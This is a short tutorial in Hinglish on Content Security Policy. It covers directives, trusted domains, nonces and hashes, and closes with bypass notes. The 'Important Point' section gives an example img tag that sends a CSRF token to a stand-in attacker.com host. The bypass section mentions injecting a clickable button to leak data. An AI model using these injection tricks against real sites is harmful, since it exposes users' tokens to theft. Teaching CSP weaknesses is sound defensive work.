# 🔐 CSP (Content Security Policy) kya hota hai?

CSP ek browser ki security technique hai jo mostly XSS jaise attacks ko rokne ke liye banayi gayi hai.

Iska kaam hota hai ke:

Page kin domains se scripts ya images load karein, usko control kare.

Page iframe mein load ho sakta hai ya nahi, wo bhi control kare.

### 🧾 CSP kaam kaise karta hai?

CSP enable karne ke liye, web server response mein ek HTTP header lagata hai:

Content-Security-Policy: [policy]

Policy mein rules (directives) hote hain — alag alag ; se separated.


### 🛡️ Example Policies:

Sirf apni domain se scripts allow:

script-src 'self'

Sirf ek trusted domain se allow:

**script-src https://scripts.normal-website.com**

Lekin agar trusted domain attacker ke control mein aajaye (jaise public CDN — ajax.googleapis.com), toh attack ho sakta hai. Isliye trusted source carefully use karna chahiye.

### 🔐 Advanced Trust Methods:

1. Nonce:

Ek random value hoti hai (jaise: **nonce-xyz123**)

CSP header aur **<script>** tag dono mein match honi chahiye.

Har page load pe new generate honi chahiye.

2. Hash:

Agar ek script static hai, toh uski content ka **SHA256** hash CSP mein daal do.

Agar script badalti hai, hash bhi update karna padega.

### 🎯 Important Point:

CSP aksar script requests block karta hai — lekin image requests ko allow kar deta hai.

Attacker img tag ke zariye sensitive info (jaise CSRF token) apni site pe bhej sakta hai:

**<img src="https://attacker.com/steal?token=XYZ">**

### 😈 Advanced Bypass:

Kuch browsers (Chrome) khud hi kuch malicious characters block karte hain (jaise raw < or \n).

Lekin attacker still HTML element inject karke user se interaction karwa ke data le sakta hai. Jaise koi **<button>** jisko user click kare aur info leak ho jaye.

